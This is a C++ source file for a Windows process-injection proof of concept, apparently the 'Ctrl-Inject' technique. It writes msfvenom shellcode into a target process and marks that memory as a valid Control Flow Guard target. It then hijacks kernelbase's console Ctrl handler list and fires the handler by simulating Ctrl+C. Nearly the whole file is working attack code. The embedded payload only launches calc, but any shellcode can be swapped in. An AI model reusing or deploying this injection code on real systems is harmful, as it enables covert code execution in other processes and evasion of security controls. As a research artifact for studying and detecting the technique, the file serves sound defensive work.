// PROPagate.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <psapi.h>

typedef BOOL(WINAPI *prototype_SetProcessValidCallTargets)(
	HANDLE					hProcess,
	PVOID					VirtualAddress,
	SIZE_T					RegionSize,
	ULONG					NumberOfOffsets,
	PCFG_CALL_TARGET_INFO	OffsetInformation
	);

typedef HRESULT(WINAPI *prototype_RtlEncodeRemotePointer)(
	HANDLE		ProcessHandle,
	PVOID		Ptr,
	PVOID *		EncodedPtr
);

typedef HRESULT (WINAPI *prototype_RtlDecodeRemotePointer)(
	_In_ HANDLE    ProcessHandle,
	_In_opt_ PVOID Ptr,
	_Out_ PVOID *  DecodedPtr
);

#define STATUS_SUCCESS 1
#define STATUS_FAIL -1

//original: https://github.com/BreakingMalwareResearch/CFGExceptions/blob/master/CFGExceptions/main.cpp
int GetFunctionAddressFromDll(PSTR pszDllName,	PSTR pszFunctionName, PVOID *ppvFunctionAddress)
{
	HMODULE hModule = NULL;
	PVOID	pvFunctionAddress = NULL;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		printf("[-] Couldn't get handle to %s", pszDllName);
		return STATUS_FAIL;
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == pvFunctionAddress)
	{
		printf("[-] Couldn't get address of %s", pszFunctionName);
		return STATUS_FAIL;
	}

	*ppvFunctionAddress = pvFunctionAddress;
	return STATUS_SUCCESS;
}

//original: https://github.com/BreakingMalwareResearch/CFGExceptions/blob/master/CFGExceptions/main.cpp
int GetMemoryAllocationBaseAndRegionSize(PVOID pvAddress, PVOID *ppvAllocationBase, PSIZE_T pstRegionSize)
{
	SIZE_T						stErr = 0;
	MEMORY_BASIC_INFORMATION	tMemoryBasicInformation = { 0 };

	stErr = VirtualQuery(pvAddress,	&tMemoryBasicInformation, sizeof(tMemoryBasicInformation));
	if (0 == stErr)
	{
		return STATUS_FAIL;
	}

	*ppvAllocationBase = tMemoryBasicInformation.AllocationBase;
	*pstRegionSize = tMemoryBasicInformation.RegionSize;

	return STATUS_SUCCESS;
}

HWND GetWindowFromPID(DWORD mypid)
{
	HWND h = GetTopWindow(0);
	while (h)
	{
		DWORD pid;
		DWORD dwTheardId = ::GetWindowThreadProcessId(h, &pid);
		if (pid == mypid)
		{
			return h;
		}
		h = GetNextWindow(h, GW_HWNDNEXT);
	}
	return 0;
}

LPVOID GetModuleBaseAddress(PSTR pszDllName)
{
	MODULEINFO module_info;
	HMODULE hModule = GetModuleHandleA(pszDllName);
	BOOL bres;
	bres = GetModuleInformation(GetCurrentProcess(), hModule, &module_info, sizeof(module_info));
	if (!bres)
	{
		printf("[-] Couldn't find %s base address\n", pszDllName);
		return NULL;
	}
	printf("[+] %s base address is: 0x%llx\n", (pszDllName, (DWORD64)module_info.lpBaseOfDll));
	return module_info.lpBaseOfDll;
}

//https://blog.ensilo.com/ctrl-inject
void TriggerCtrlC(HWND hWindow)
{
	INPUT ip;
	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;
	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = 0; //0 for keypress
	SendInput(1, &ip, sizeof(INPUT));
	Sleep(300);
	PostMessage(hWindow, WM_KEYDOWN, 0x43, 0);
	Sleep(300);
	ip.ki.dwFlags = 2; //2 for keyup (we want this, as we don't want to keep a system wide CTRL down)
	SendInput(1, &ip, sizeof(INPUT));

}

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: Ctrlinject.exe [PID]\n");
		return 1;
	}

	//msfvenom --payload  windows/x64/exec CMD="calc" EXITFUNC=thread
	unsigned char shellcode[] = {
		0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
		0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
		0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
		0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
		0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
		0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
		0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
		0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
		0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
		0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
		0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
		0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
		0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
		0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
		0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
		0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
		0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
		0x63,0x00 };

	DWORD pid = (DWORD)atoi(argv[1]);

	/* Get Handle to process */

	printf("[i] Opening process\n");
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		printf("[-] Couldn't open process, exiting...\n");
		return -1;
	}
	else
	{
		printf("[+] Process handle: 0x%x\n", (UINT)hProcess);
	}

	/* Allocate memory in target process */
	printf("[i] Allocating memory in process\n");
	LPVOID lpBaseAddress;
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		printf("[-] Couldn't allocate memory in process, exiting...\n");
		return -1;
	}
	else
	{
		printf("[+] Memory allocated at: 0x%llx\n", (DWORD64)lpBaseAddress);
	}


	SIZE_T *lpNumberOfBytesWritten = 0;
	printf("[i] Writing shellcode to process\n");

	BOOL resWPM;
	resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), lpNumberOfBytesWritten);

	if (!resWPM)
	{
		printf("[-] Couldn't write to memory in target process, exiting...\n");
		return STATUS_FAIL;
	}
	printf("[+] Shellcode is written to memory\n");

	printf("[i] Encoding pointer\n");

	prototype_RtlEncodeRemotePointer pfnRtlEncodeRemotePointer = NULL;
	PVOID pvEncodedPtr = NULL;
	int res = 0;
	res = GetFunctionAddressFromDll("ntdll.dll", "RtlEncodeRemotePointer", (PVOID *)&pfnRtlEncodeRemotePointer);
	if (res == STATUS_FAIL)
	{
		printf("[-] Couldn't do lookup, exiting...\n");
		return STATUS_FAIL;
	}
	HRESULT hRes = pfnRtlEncodeRemotePointer(hProcess, lpBaseAddress, &pvEncodedPtr);
	if (hRes != S_OK)
	{
		printf("[-] Encoding pointer failed");
		return STATUS_FAIL;
	}
	printf("[+] Encoded pointer is: 0x%llx\n", (DWORD64)pvEncodedPtr);

	printf("[i] Set call target vaid for CFG\n");

	prototype_SetProcessValidCallTargets	pfnSetProcessValidCallTargets = NULL;

	res = GetFunctionAddressFromDll("kernelbase.dll", "SetProcessValidCallTargets", (PVOID *)&pfnSetProcessValidCallTargets);
	if (res == STATUS_FAIL)
	{
		printf("[-] Couldn't do lookup, exiting...\n");
		return STATUS_FAIL;
	}

	CFG_CALL_TARGET_INFO tCfgCallTargetInfo = { 0 };
	tCfgCallTargetInfo.Flags = CFG_CALL_TARGET_VALID;
	PVOID pvAllocationBase = NULL;
	SIZE_T stRegionSize = 0;

	res = GetMemoryAllocationBaseAndRegionSize(lpBaseAddress, &pvAllocationBase, &stRegionSize);
	if (res == STATUS_FAIL)
	{
		printf("[-] Couldn't do GetMemoryAllocationBaseAndRegionSize, exiting...\n");
		return STATUS_FAIL;
	}

	tCfgCallTargetInfo.Offset = (ULONG_PTR)lpBaseAddress - (ULONG_PTR)pvAllocationBase;
	pfnSetProcessValidCallTargets(hProcess, pvEncodedPtr, 0x1000, 0x1, &tCfgCallTargetInfo);
	
	/*
	printf("[i] Locating kernelbase.dll address\n");

	LPVOID kernelbase_address = GetModuleBaseAddress("kernelbase.dll");
	if (!kernelbase_address)
	{
		printf("[-] Couldn't find kernelbase.dll base address, exiting...\n");
		return STATUS_FAIL;
	}
	*/
	LPVOID SetConsoleCtrlHandler_address;
	res = GetFunctionAddressFromDll("kernelbase.dll", "SetConsoleCtrlHandler", &SetConsoleCtrlHandler_address);
	if (res == STATUS_FAIL)
	{
		printf("[-] Couldn't do lookup, exiting...\n");
		return STATUS_FAIL;
	}
	printf("[+] SetConsoleCtrlHandler address is: 0x%llx\n", (DWORD64)SetConsoleCtrlHandler_address);

	LPVOID b = NULL;
	SIZE_T lpNumberOfBytesRead;
	BOOL resRPM;
	int i = 0;
	while(TRUE)
	{
		//Search this in memory
		//00007ffc`2b62a761 e85a000000      call    KERNELBASE!SetCtrlHandler (00007ffc`2b62a7c0)
		resRPM = ReadProcessMemory(hProcess, (LPVOID)((DWORD64)SetConsoleCtrlHandler_address+i), &b, 0x1, &lpNumberOfBytesRead);
		if (!resRPM)
		{
			printf("[-] Couldn't read from memory of target process, exiting...\n");
			return STATUS_FAIL;
		}
		if ((BYTE)b == 0xe8)
		{
			resRPM = ReadProcessMemory(hProcess, (LPVOID)((DWORD64)SetConsoleCtrlHandler_address + i + 1), &b, 0x1, &lpNumberOfBytesRead);
			if (!resRPM)
			{
				printf("[-] Couldn't read from memory of target process, exiting...\n");
				return STATUS_FAIL;
			}
			break;
		}
		i++;
		if (i == 200)
		{
			printf("[-] Couldn't find call in function, exiting...\n");
			return STATUS_FAIL;
		}
	}

	LPVOID SetCtrlHandler_address = (LPVOID)((DWORD64)SetConsoleCtrlHandler_address + i + 5 + (BYTE)b);
	printf("[+] SetCtrlHandler address is: 0x%llx\n", (DWORD64)SetCtrlHandler_address);

	b = 0;
	i = 0;
	while (TRUE)
	{
		//search this in memory
		//00007ffc`2b62a7cf 8b3d7bdb1a00    mov     edi,dword ptr [KERNELBASE!HandlerListLength (00007ffc`2b7d8350)]
		resRPM = ReadProcessMemory(hProcess, (LPVOID)((DWORD64)SetCtrlHandler_address + i), &b, 0x1, &lpNumberOfBytesRead);
		if (!resRPM)
		{
			printf("[-] Couldn't read from memory of target process, exiting...\n");
			return STATUS_FAIL;
		}
		if ((BYTE)b == 0x8b)
		{
			resRPM = ReadProcessMemory(hProcess, (LPVOID)((DWORD64)SetCtrlHandler_address + i + 2), &b, 0x4, &lpNumberOfBytesRead);
			if (!resRPM)
			{
				printf("[-] Couldn't read from memory of target process, exiting...\n");
				return STATUS_FAIL;
			}
			break;
		}
		i++;
		if (i == 200)
		{
			printf("[-] Couldn't find call in function, exiting...\n");
			return STATUS_FAIL;
		}
	}

	LPVOID HandlerListLength_in_kernelbase = (LPVOID)((DWORD64)SetCtrlHandler_address + i + 6 + (DWORD32)b);
	printf("[+] HandlerListLength address is: 0x%llx\n", (DWORD64)HandlerListLength_in_kernelbase);
	LPVOID HandlerList_in_kernelbase = LPVOID((DWORD64)HandlerListLength_in_kernelbase + 0x8);
	/*
	//OLD HARDCODED
	DWORD64 HandlerList_offset = 0x218358; //For now it's hardcoded for Windows 10 RS3 (1709)
	printf("[+] Offset to HandlerList is: 0x%llx\n", (DWORD64)HandlerList_offset);
	LPVOID HandlerList_in_kernelbase = LPVOID((DWORD64)kernelbase_address + 0x218358);
	LPVOID HandlerListLength_in_kernelbase = LPVOID((DWORD64)kernelbase_address + 0x218358 -8);

	printf("[+] HandlerList address can be found at: 0x%llx\n", (DWORD64)HandlerList_in_kernelbase);
	printf("[+] HandlerListLength address can be found at: 0x%llx\n", ((DWORD64)HandlerListLength_in_kernelbase));
	*/
	printf("[i] Locating HandlerList\n");
	LPVOID HandlerListAddress;
	resRPM = ReadProcessMemory(hProcess, HandlerList_in_kernelbase, &HandlerListAddress, 0x8, &lpNumberOfBytesRead);
	if (!resRPM)
	{
		printf("[-] Couldn't read HandlerList from memory of target process, exiting...\n");
		return STATUS_FAIL;
	}
	printf("[+] HandlerList is at: 0x%llx\n", (DWORD64)HandlerListAddress);

	LPVOID HandlerListLength;
	resRPM = ReadProcessMemory(hProcess, HandlerListLength_in_kernelbase, &HandlerListLength, 0x4, &lpNumberOfBytesRead);
	if (!resRPM)
	{
		printf("[-] Couldn't read HandlerListLength from memory of target process, exiting...\n");
		return STATUS_FAIL;
	}
	printf("[+] HandlerListLength is: 0x%llx\n", (DWORD32)HandlerListLength);

	if ((DWORD32)HandlerListLength < 2)
	{
		printf("[-] HandlerListLength is too small, exiting...\n");
		return STATUS_FAIL;
	}

	printf("[i] Saving original value at HandlerList\n");
	
	//this shift calculation is to overwrite the lastly added Handler and not the first default one
	DWORD32 shift = ((DWORD32)HandlerListLength - 1) * 8;
	LPVOID shiftedHandlerListAddress = (LPVOID)((DWORD64)HandlerListAddress + shift);
	LPVOID orig_Handler;
	ReadProcessMemory(hProcess, shiftedHandlerListAddress, &orig_Handler, 0x8, &lpNumberOfBytesRead);
	if (!resRPM)
	{
		printf("[-] Couldn't read from memory of target process, exiting...\n");
		return STATUS_FAIL;
	}
	printf("[+] Original Handler value is: 0x%llx\n", (DWORD64)orig_Handler);

	PVOID pvDecodedPtr = NULL;
	prototype_RtlDecodeRemotePointer pfnRtlDecodeRemotePointer = NULL;
	res = GetFunctionAddressFromDll("ntdll.dll", "RtlDecodeRemotePointer", (PVOID *)&pfnRtlDecodeRemotePointer);
	if (res == STATUS_FAIL)
	{
		printf("[-] Couldn't do lookup, exiting...\n");
		return STATUS_FAIL;
	}
	hRes = pfnRtlDecodeRemotePointer(hProcess, (PVOID)orig_Handler, &pvDecodedPtr);
	if (hRes != S_OK)
	{
		printf("[-] Decoding pointer failed");
		return STATUS_FAIL;
	}
	printf("[+] Original handler decoded: 0x%llx\n", (DWORD64)pvDecodedPtr);


	printf("[i] Overwriting HandlerList item\n");
	resWPM = WriteProcessMemory(hProcess, shiftedHandlerListAddress, &pvEncodedPtr, 0x8, lpNumberOfBytesWritten);
	if (!resWPM)
	{
		printf("[-] Couldn't write to memory in target process, exiting...\n");
		return STATUS_FAIL;
	}

	HWND hwnd_other = GetWindowFromPID(pid);
	if (hwnd_other == NULL)
	{
		printf("[-] Couldn't find window...\n");
	}
	else
	{
		printf("[i] Triggering injection\n");
		TriggerCtrlC(hwnd_other);
	}
	
	Sleep(1000);
	printf("[i] Restore HandlerList item\n");
	resWPM = WriteProcessMemory(hProcess, shiftedHandlerListAddress, &orig_Handler, 0x8, lpNumberOfBytesWritten);
	if (!resWPM)
	{
		printf("[-] Couldn't write to memory in target process, exiting...\n");
		return STATUS_FAIL;
	}
	
	return 0;
}

